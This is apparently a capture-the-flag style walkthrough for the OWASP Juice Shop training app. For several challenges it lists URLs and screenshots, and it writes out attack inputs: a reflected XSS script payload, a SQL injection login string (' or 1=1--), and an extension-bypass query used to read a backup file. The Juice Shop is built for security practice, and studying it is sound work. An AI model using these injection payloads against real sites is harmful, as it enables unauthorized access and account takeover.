#### OWASP Juice Shop

###### Score Board

Find the carefully hidden 'Score Board' page

![](images/1/1.png)

![](images/1/2.png)

![](images/1/3.png)

###### Error Handling

Provoke an error that is not very gracefully handled

```
https://juice-shop.herokuapp.com/#/search?q=test';
https://juice-shop.herokuapp.com/ftp/something
https://juice-shop.herokuapp.com/ftp/something.md
```

```
https://juice-shop.herokuapp.com/#/login
Username: '
Password: shbfv
```

![](images/2/1.png)

![](images/2/2.png)

![](images/2/3.png)

![](images/2/4.png)

![](images/2/5.png)

###### XSS Tier 1

Perform a reflected XSS attack with ``<script>alert("XSS1")</script>``

```
https://juice-shop.herokuapp.com/#/search?q=<script>alert("XSSME")</script>
```

```javascript
<script>alert("XSSME")</script>
```

![](images/3/1.png)

###### Five-Star Feedback

Get rid of all 5-star customer feedback

```
https://juice-shop.herokuapp.com/#/administration
```

![](images/4/1.png)

![](images/4/2.png)

![](images/4/3.png)

###### Confidential Document

Access a confidential document

```
https://juice-shop.herokuapp.com/ftp/
https://juice-shop.herokuapp.com/ftp/legal.md
https://juice-shop.herokuapp.com/ftp/acquisitions.md
```

![](images/5/4.png)

![](images/5/1.png)

![](images/5/2.png)

![](images/5/3.png)

###### Admin Section

Access the administration section of the store

```
https://juice-shop.herokuapp.com/#/administration
```

![](images/6/1.png)

![](images/6/2.png)

###### Zero Stars

Give a devastating zero-star feedback to the store

```
https://juice-shop.herokuapp.com/#/contact
https://juice-shop.herokuapp.com/#/administration
https://juice-shop.herokuapp.com/#/about
```

![](images/7/1.png)

![](images/7/2.png)

![](images/7/3.png)

###### Login Admin

Log in with the administrator's user account

```
https://juice-shop.herokuapp.com/#/login
Username: ' or 1=1-- 
Password: dnfgbdfhjb
```

![](images/8/1.png)

![](images/8/2.png)

###### Basket Access

Access someone else's basket

![](images/9/1.png)

![](images/9/2.png)

![](images/9/3.png)

![](images/9/4.png)

![](images/9/5.png)

###### Forgotten Sales Backup

Access a salesman's forgotten backup file

```
https://juice-shop.herokuapp.com/ftp
https://juice-shop.herokuapp.com/ftp/coupons_2013.md.bak
https://juice-shop.herokuapp.com/ftp/coupons_2013.md.bak?md_debug=.md
```

![](images/10/1.png)

![](images/10/2.png)

![](images/10/3.png)

![](images/10/4.png)

![](images/10/5.png)

###### Weird Crypto

Inform the shop about an algorithm or library it should definitely not use the way it does
